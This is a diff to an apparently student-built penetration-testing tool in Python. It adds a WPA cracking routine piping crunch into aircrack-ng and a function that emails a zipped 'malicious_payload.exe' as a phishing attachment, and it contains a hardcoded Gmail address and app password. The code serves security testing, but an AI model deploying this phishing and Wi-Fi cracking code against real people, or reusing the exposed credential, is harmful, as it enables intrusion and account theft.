@@ -135,6 +135,8 @@ def droptablesR():
     conn.commit()
     conn.execute('''DELETE FROM RecDB.OSDiscovery''')
     conn.commit()
+    conn.execute('''DELETE FROM RecDB.NetBIOS_Enumeration''')
+    conn.commit()
     conn.execute('''DELETE FROM RecDB.SNMP_OS_Enumeration''')
     conn.commit()
     conn.execute('''DELETE FROM RecDB.SNMP_Process_Enumeration''')
@@ -233,7 +235,6 @@ def droptables():
     droptablesE()
 
 createtables()
-loop = True
 def project_menu():
     loop = True
     while loop == True:
@@ -441,6 +442,8 @@ def enum_menu():
 def vulnscanning_menu():
     vulnscanning_loop = True
     while vulnscanning_loop == True:
+        ascii_vuln = pyfiglet.figlet_format("Vulnerability Scanning")
+        print(ascii_vuln)
         #Input Scanning Options
         print("\nPlease Select an Option Below.")
         print("1. OpenVAS")
@@ -474,6 +477,8 @@ def vulnscanning_menu():
 def exploit_menu():
     exploit_loop = True
     while exploit_loop == True:
+        ascii_exploit = pyfiglet.figlet_format("Exploitations & Post Exploitations")
+        print(ascii_exploit)
         #Input Scanning Options
         print("\nPlease Select an Option Below.")
         print("1. Packet Sniffer")
@@ -526,17 +531,7 @@ def database_menu():
         menu_input = (input("Select option: "))
         if menu_input == "1":
             droptables()
-            conn.execute('''DELETE FROM Spider''')
-            conn.commit()
             print("Database successfully cleared!")
-        # elif menu_input == "2":
-        #     DBname = str(input('Enter new Database name here: '))
-        #     newDBname = DBname + ".db"
-        #     conn = sqlite3.connect(newDBname)
-        #     conn.execute('ATTACH DATABASE newDBname as "newDB"')
-        #     conn.execute('ATTACH DATABASE "APTdatabase.db" as "oldDB"')
-        #     newdatabase(conn)
-        #     print("Database " + "APTdatabase.db" + "successfully copied as " + newDBname)
         elif menu_input == "2":
             database_loop = False
         else:
@@ -1198,7 +1193,7 @@ def packet_sniffer():
 
 def vulnerable_tcp_ports():
     
-    vulnerable_tcp_ports = [[7, "Echo", "Vulneraility: \nDOS Threat: Attackers may use it to relay flooding data and to flood the port with a large volume of requests, consuming network resources and causing a service disruption. \nAmplification Attacks: Since the Echo protocol will respond with an exact copy, attackers may send small requests to port 7, and the Echo protocol may potentially amplify the attack and increase its impact.", "\nSolution: \nDisable this port or restrict access to this port, and enable briefly only for troublehshooting."], 
+    vulnerable_tcp_ports = [[7, "Echo", "Vulnerability: \nDOS Threat: Attackers may use it to relay flooding data and to flood the port with a large volume of requests, consuming network resources and causing a service disruption. \nAmplification Attacks: Since the Echo protocol will respond with an exact copy, attackers may send small requests to port 7, and the Echo protocol may potentially amplify the attack and increase its impact.", "\nSolution: \nDisable this port or restrict access to this port, and enable briefly only for troublehshooting."], 
     
     [19, "Chargen", "Vulnerability: \nDOS Threat: Attackers may loop it to the echo port, creating a DOS Attack.", "\nSolution: \nDisable this port or restrict access to this port, and enable briefly only for troubleshooting."],
     
@@ -1309,11 +1304,11 @@ def vulnerable_tcp_ports():
 
 def vulnerable_udp_ports():
     
-    vulnerable_udp_ports =  [[7, "Echo", "Vulneraility: \nDOS Threat: Attackers may use it to relay flooding data and to flood the port with a large volume of requests, consuming network resources and causing a service disruption. \n Amplification Attacks: Since the Echo protocol will respond with an exact copy, attackers may send small requests to port 7, and the Echo protocol may potentially amplify the attack and increase its impact.", "\nSolution: \nDisable this port or restrict access to this port, and enable briefly only for troublehshooting."], 
+    vulnerable_udp_ports =  [[7, "Echo", "Vulnerability: \nDOS Threat: Attackers may use it to relay flooding data and to flood the port with a large volume of requests, consuming network resources and causing a service disruption. \n Amplification Attacks: Since the Echo protocol will respond with an exact copy, attackers may send small requests to port 7, and the Echo protocol may potentially amplify the attack and increase its impact.", "\nSolution: \nDisable this port or restrict access to this port, and enable briefly only for troublehshooting."], 
     
     [19, "Chargen", "Vulnerability: \nDOS Threat: Attackers may loop it to the echo port, creating a DOS Attack.", " \nSolution: \nDisable this port or restrict access to this port, and enable briefly only for troubleshooting."],
     
-    [53, "DNS [Domain Name System]", "Vulneraility: \nDOS Threat: Attackers may flood DNS servers with a high volume of requests, causing service disruption and denying legitimate users access. \nDNS Spoofing Threat:Attackers may manipulate DNS responses to redirect users to malicious websites or intercept their traffic by poisoning the DNS cache.", "\nSolution: \nImplement Rate Limiting by configuring your DNS server to limit the rate of incoming DNS queries from a single source to prevent DNS amplification and DoS attacks. \n Implement DNSSEC (DNS Security Extensions) which adds digital signatures and authentication to DNS responses, ensuring data integrity and preventing cache poisoning attacks."],
+    [53, "DNS [Domain Name System]", "Vulnerability: \nDOS Threat: Attackers may flood DNS servers with a high volume of requests, causing service disruption and denying legitimate users access. \nDNS Spoofing Threat:Attackers may manipulate DNS responses to redirect users to malicious websites or intercept their traffic by poisoning the DNS cache.", "\nSolution: \nImplement Rate Limiting by configuring your DNS server to limit the rate of incoming DNS queries from a single source to prevent DNS amplification and DoS attacks. \n Implement DNSSEC (DNS Security Extensions) which adds digital signatures and authentication to DNS responses, ensuring data integrity and preventing cache poisoning attacks."],
 
     [69, "Trivial File Transfer Protocl","Vulnerability: \nNo Authentication: TFTP does not provide any built-in authentication mechanism, which means that anyone with access to the TFTP server can read from or write to files on the server without requiring any credentials.\nNo Encryption: TFTP does not support encryption, which means that data transmitted over the network is in clear text and can be intercepted by attackers.", "\nSolution: \nReview and configure the TFTP server to provide the necessary access rights only to authorized users. Avoid providing write access to critical system files or directories.\nIsolate critical systems or sensitive files from the TFTP server by using network segmentation. This ensures that even if the TFTP server is compromised, the impact on other parts of the network is limited."],
 
@@ -1855,18 +1850,48 @@ def crack_password():
     result.close()
     file_name = input("Enter the name desired .cap file (eg. if the .cap file name is dump-01.cap, please enter dump-01) : ")
     digits = int(input("Enter the number of digits of the password: "))
-    ssid = input("Enter the wifi networks name: ")
+    ssid = input("Enter the wifi network name: ")
     subprocess.Popen(['gnome-terminal', '-e', 'bash -c "crunch 8 {} 0123456789 | aircrack-ng -e "{}" -w- {}.cap -l result.txt; exec bash"'.format(digits,ssid,file_name)])
     input("Please press enter once the password has been cracked ")
     file = open('result.txt', 'r')
-    lines = file.readlines()
-    for line in lines:
-        temp_list = line.split(":")
-        line_list = [temp_list[0] + ':' + temp_list[1] + ':' + temp_list[2], temp_list[3]]
-        cur.execute('''INSERT INTO ExpDB.WPA 
-        (id, SSID, Password) 
-        VALUES (NULL, ?, ?, ?)''', line_list)
-        conn.commit()
+    password = file.readlines()
+    wpa_list = [str(ssid), str(password[0])]
+    cur.execute('''INSERT INTO ExpDB.WPA 
+    (id, SSID, Password) 
+    VALUES (NULL, ?, ?)''', wpa_list)
+    conn.commit()
+
+def email():
+    my_zip = zipfile.ZipFile('payload.zip', 'w')
+
+    my_zip.write('Payloads/malicious_payload.exe')
+
+    my_zip.close()
+    email_sender = 'automatedpenetrationtesting@gmail.com'
+    email_password = 'sniczghgyrybspsh'
+
+    email_receiver = str(input("Enter email recipient here: "))#input here
+
+    subject = 'I like fishes' #input here
+    body = """
+    This is a phishing email do not click on the file
+    """ #input here
+
+    em = EmailMessage()
+    em['From'] = email_sender
+    em['To'] = email_receiver
+    em['Subject'] = subject
+    em.set_content(body)
+
+    with open('Payloads/payload.zip', 'rb') as content_file:
+        content = content_file.read()
+        em.add_attachment(content, maintype='application', subtype='zip', filename='payload.zip')
+
+    context = ssl.create_default_context()
+
+    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
+        smtp.login(email_sender, email_password)
+        smtp.sendmail(email_sender, email_receiver, em.as_string())
 
 def report_generation():
     ascii_report = pyfiglet.figlet_format("Report Generation")
@@ -2529,29 +2554,3 @@ def report_generation():
     conn.close()
     
 project_menu()
-
-
-#MENU TEMPLATE FOR REPORT
-
-#def vulnscanning_menu():
-#    vulnscanning_loop = True
-#    while vulnscanning_loop == True:
-#        #Input Scanning Options
-#        print("\nPlease Select an Option Below.")
-#        print("1. Option 1")
-#        print("2. Option 2")
-#        print("3. Exit")
-#        menu_input = (input("Select option: "))
-#        if menu_input == "1":
-#            ascii_1 = pyfiglet.figlet_format("Option 1")
-#            print(ascii_1)
-#            hostDiscovery()
-#        elif menu_input == "2":
-#            ascii_2 = pyfiglet.figlet_format("Option 2")
-#            print(ascii_2)
-#            portDiscovery()
-#        elif menu_input == "3":
-#            vulnscanning_loop = False
-#        else:
-#            print("Invalid Input!\nPlease Try Again!")
-#            continue
